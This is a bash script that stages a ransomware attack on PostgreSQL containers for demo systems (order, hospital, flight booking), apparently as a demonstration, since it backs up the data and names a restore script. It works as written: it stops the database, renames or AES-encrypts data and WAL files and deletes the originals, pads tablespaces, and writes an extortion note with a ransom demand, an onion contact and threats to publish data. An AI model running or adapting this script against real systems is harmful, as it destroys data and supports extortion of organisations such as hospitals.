#!/bin/bash
# ==============================================================================
# encrypt_postgres_luigi.sh  -  PostgreSQL encryption attack  (Luigi Edition)
# Must run as root:  sudo ./encrypt_postgres_luigi.sh
# Recovery:         sudo ./restore_postgres.sh
# ==============================================================================

[[ $EUID -ne 0 ]] && echo "ERROR: run as root  ->  sudo $0" && exit 1

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
KEY="password123"
PADDING_COUNT=10
PADDING_SIZE_MB=1024

# -- Colours ------------------------------------------------------------------
RED='\033[0;31m' YEL='\033[1;33m' GRN='\033[0;32m'
CYA='\033[0;36m' BLD='\033[1m'   RST='\033[0m'

# -- Demo selection -----------------------------------------------------------
DEMO="${1:-}"
if [[ -z "$DEMO" ]]; then
    echo ""
    echo -e "${GRN}${BLD}  Select target demo:${RST}"
    echo -e "    ${CYA}1)${RST}  processed-meat    ${CYA}(Order Simulator)${RST}"
    echo -e "    ${CYA}2)${RST}  hospital          ${CYA}(Hospital Data Management)${RST}"
    echo -e "    ${CYA}3)${RST}  flight-booking    ${CYA}(Flight Booking System)${RST}"
    echo ""
    read -rp "  Choice [1-3]: " _CHOICE
    case "$_CHOICE" in
        1) DEMO="processed-meat" ;;
        2) DEMO="hospital" ;;
        3) DEMO="flight-booking" ;;
        *) echo "ERROR: invalid choice '$_CHOICE'"; exit 1 ;;
    esac
fi

case "$DEMO" in
    processed-meat)
        CONTAINER="processed-meat-postgresql"
        PGDATA="/data/processed-meat/postgresql"
        ;;
    hospital)
        CONTAINER="hospital-postgresql"
        PGDATA="/data/hospital/postgresql"
        ;;
    flight-booking)
        CONTAINER="flight-booking-postgresql"
        PGDATA="/data/flight-booking/postgresql"
        ;;
    *)
        echo "ERROR: unknown demo '${DEMO}'. Use: processed-meat | hospital | flight-booking"
        exit 1
        ;;
esac

BACKUP_DIR="$SCRIPT_DIR/backup/$DEMO"
PADDING_DIR="$PGDATA/pg_tblspc"

# -- Progress bar -------------------------------------------------------------
progress() {
    local cur=$1 tot=$2 lbl="$3"
    local pct=$(( tot > 0 ? cur * 100 / tot : 100 ))
    local fill=$(( tot > 0 ? cur * 40 / tot : 40 ))
    local bar
    bar=$(printf '%-40s' "$(printf '%0.s#' $(seq 1 $fill))" | tr ' ' '-')
    printf "\r    ${CYA}[%s]${RST} %3d%%  %s" "$bar" "$pct" "$lbl"
}

# -- Banner -------------------------------------------------------------------
clear
echo -e "${GRN}${BLD}"
echo ""
echo "            ██╗     ██╗   ██╗██╗ ██████╗ ██╗"
echo "            ██║     ██║   ██║██║██╔════╝ ██║"
echo "            ██║     ██║   ██║██║██║  ███╗██║"
echo "            ██║     ██║   ██║██║██║   ██║██║"
echo "            ███████╗╚██████╔╝██║╚██████╔╝██║"
echo "            ╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚═╝"
echo ""
echo "      T h e   G r e e n   P l u m b e r   i n   A c t i o n"
echo -e "${RST}"
sleep 1

# -- [1/4] Stop PostgreSQL ----------------------------------------------------
echo -e "${BLD}[1/4] Stopping database container: ${CYA}${CONTAINER}${RST}${BLD}...${RST}"
docker stop "$CONTAINER"
echo -e "      ${GRN}Container stopped.${RST}\n"

# -- [2/4] Backup (silent) ----------------------------------------------------
echo -e "${BLD}[2/4] Creating backup...${RST}"
rm -rf "$BACKUP_DIR"
mkdir -p "$BACKUP_DIR"
cp -r "$PGDATA" "$BACKUP_DIR/"
chown -R adminhpe:adminhpe "$BACKUP_DIR" 2>/dev/null || true
echo -e "      ${GRN}Done: $(du -sh "$BACKUP_DIR" | cut -f1) total${RST}"
echo -e "      ${CYA}Recovery: sudo $SCRIPT_DIR/restore_postgres.sh${RST}\n"

# -- [3/4] Encrypt database files ---------------------------------------------
echo -e "${BLD}[3/4] Encrypting database files...${RST}"

# base/: rename to .locked (fast — no data copy needed)
BASE_COUNT=$(find "$PGDATA/base" -type f | wc -l)
find "$PGDATA/base" -type f | while read -r f; do mv "$f" "${f}.locked"; done
echo -e "      ${GRN}base/    locked  ($BASE_COUNT files)${RST}"

# pg_wal/: full AES-256 encryption
mapfile -t WAL_FILES < <(find "$PGDATA/pg_wal" -type f)
TOTAL=${#WAL_FILES[@]}; N=0
for f in "${WAL_FILES[@]}"; do
    N=$((N+1))
    progress "$N" "$TOTAL" "pg_wal/$(basename "$f")"
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
        -in "$f" -out "$f.locked" -k "$KEY" 2>/dev/null
    rm -f "$f"
done
echo ""
echo -e "      ${GRN}pg_wal/  encrypted  ($TOTAL files)${RST}\n"

# -- [4/4] Encrypt tablespace data (bulk — main encryption pass) ---------------
echo -e "${BLD}[4/4] Encrypting tablespace data...${RST}"

rm -rf "$PADDING_DIR"
mkdir -p "$PADDING_DIR"
for i in $(seq 1 $PADDING_COUNT); do
    dd if=/dev/zero of="$PADDING_DIR/tblspc_${i}.dat" \
       bs=1M count="$PADDING_SIZE_MB" status=none 2>/dev/null
done

mapfile -t TS_FILES < <(find "$PADDING_DIR" -type f -name "*.dat")
TOTAL=${#TS_FILES[@]}; N=0
for f in "${TS_FILES[@]}"; do
    N=$((N+1))
    progress "$N" "$TOTAL" "tblspc_${N}.dat  [$(( N * PADDING_SIZE_MB )) / $(( TOTAL * PADDING_SIZE_MB )) MB]"
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
        -in "$f" -out "$f.locked" -k "$KEY" 2>/dev/null
    rm -f "$f"
done
echo ""
echo -e "      ${GRN}Tablespace data encrypted.${RST}\n"

# -- Write ransom note (Luigi face + text, side by side) ----------------------
RANSOM_NOTE="$PGDATA/README_RESTORE.txt"
awk 'BEGIN {
    a[1]  = "                        ..:::..";
    a[2]  = "                   :+####*****####+:";
    a[3]  = "                :#%#+====+++======+###-";
    a[4]  = "             .+%#+===*#+:.  :=**+====+#%+";
    a[5]  = "           .*#*====*+   ===     =#+====+#%+";
    a[6]  = "          +#*=====#-    ===      .#+=====+##:";
    a[7]  = "        .#*======**     ==+  .    -#=======*#+";
    a[8]  = "       =#+=======#=     =====+:   :#========+#*";
    a[9]  = "      *#+========+*     -::...    -*=========+#*";
    a[10] = "     *#===========*-.-*########*=-#===========+#*";
    a[11] = "    *#==========+###*============+###+=========+#*";
    a[12] = "   +#+=======+*##++=================+*#*+=======+#:";
    a[13] = "  :#+======+##*+#%%%#***######***#%%%#++##=======*%.";
    a[14] = "  ##======+##++#%#%%%%#::..::::#%%%%%##+=*#*=====+#=";
    a[15] = " :#+===+=*#+=+#%+.:::.=*:::::.+=::..:-##==+#*=====*#";
    a[16] = " =#=====*#++*##::.:--::::::::::::--::::*#*++#*====+#:";
    a[17] = " +#====+##*=:-:::#:  .*-:.::::-*.  :#:::-:--=%+====#-";
    a[18] = " =#====#%*:..:::#  =*==#-:.::-#==*=  #:::.::-%#===+#-";
    a[19] = " :#*==+##*.:::.+- -*=##%+.::.+%%#=*- -+::.::-#%+==*#:";
    a[20] = "  *#+=+#*#-:::.*. *+*# +#.::.#* #*+* .*::.::#*#*=+##";
    a[21] = "   *#**#*##:::.+: =++%###=++=#%##++= -+.:::*#*#*+*%.";
    a[22] = " :##-:=#***%*::-* .**#-:..::..:-#**  *-::=##**#+:-##:";
    a[23] = ".#-.::-%****#%-:-#-#::::::::::::::*-#-::##****#=:::-#.";
    a[24] = "-#:::::=#****#+.::#:::.::::::::::::*-::-#****#*:::::#-";
    a[25] = ":#:.:::::#####:::*=.::.::::::::::::-*::.+####+:::.::#-";
    a[26] = " *+::::::.#-:::.:=#:::.:::::::::.::+-:::::*+::.::.:+*";
    a[27] = " :#-:::::.+#%%#-:.**::.....:::::::+*::=#%#%+::.::.-%:";
    a[28] = "  :#=.:::.=%%%%%%%%%%#-:.:::..:-*%%%%%%#%%%+::.:.-#:";
    a[29] = "    **:.::-#%%%%%%%%%%#%%%###%%%%%%#%%%%%%#+::.:**";
    a[30] = "      =#*::%%%%%%%%%%%%#%%%%%%%%%%%%%%%%%%#--*#=.";
    a[31] = "          .-%%%%%%%%%%%%#+:.+%%%%%%%%%%%%#=";
    a[32] = "            *##%%##%%#+::---:::*#%#%%%%##.";
    a[33] = "             #-:::::.-*+==--==+#*:::::.++";
    a[34] = "              #=.:.:::#%*####*##-::::.=*";
    a[35] = "              .#+.:::::#*#####**:::::=#";
    a[36] = "                **:.::::*#***#=:.:::**.";
    a[37] = "                 -#=.:..::::::::::-#+";
    a[38] = "                   +#=.:::+=+::.:#*.";
    a[39] = "                     -##+::::-#%+";
    a[40] = "                         :--:.";

    t[1]  = "Dear Management,";
    t[2]  = "";
    t[3]  = "Your files are ENCRYPTED.";
    t[4]  = "Your data has been EXFILTRATED.";
    t[5]  = "";
    t[6]  = "VICTIM ID:  7C2A-D4F1-9B83-E6A0";
    t[7]  = "RANSOM:     2.5 BTC  (~$150,000)";
    t[8]  = "";
    t[9]  = "Contact us within 72 hours:";
    t[10] = "";
    t[11] = "  TOR: luigiransom4k7xyzabc.onion";
    t[12] = "  TG:  @GreenMushroom_Support";
    t[13] = "  BTC: bc1qluigi2kgdy...x0w";
    t[14] = "";
    t[15] = "Every 24h without contact:";
    t[16] = "  -> ransom DOUBLES";
    t[17] = "  -> data published after 72h";
    t[18] = "";
    t[19] = "No law enforcement. We will know.";
    t[20] = "";
    t[21] = "Mama mia... patch your systems.";
    t[22] = "";
    t[23] = "        -- The Green Plumber";

    for (i = 1; i <= 40; i++) printf "%-60s  %s\n", a[i], t[i];
}' > "$RANSOM_NOTE"

# -- Final screen -------------------------------------------------------------
sleep 1
clear
echo -e "${GRN}${BLD}"
echo "  +--------------------------------------------------+"
echo "  |                                                  |"
echo "  |    ENCRYPTION COMPLETE                           |"
printf "  |    Target     : %-33s|\n" "$DEMO"
echo "  |    PostgreSQL : INACCESSIBLE                     |"
echo "  |    Data files : ENCRYPTED (AES-256-CBC)          |"
echo "  |                                                  |"
echo "  +--------------------------------------------------+"
echo -e "${RST}"
echo ""
echo -e "${YEL}${BLD}"
cat "$RANSOM_NOTE"
echo -e "${RST}"
echo -e "${CYA}  Backup    : $BACKUP_DIR"
echo -e "  Recovery  : sudo $SCRIPT_DIR/restore_postgres.sh $DEMO${RST}"
echo ""
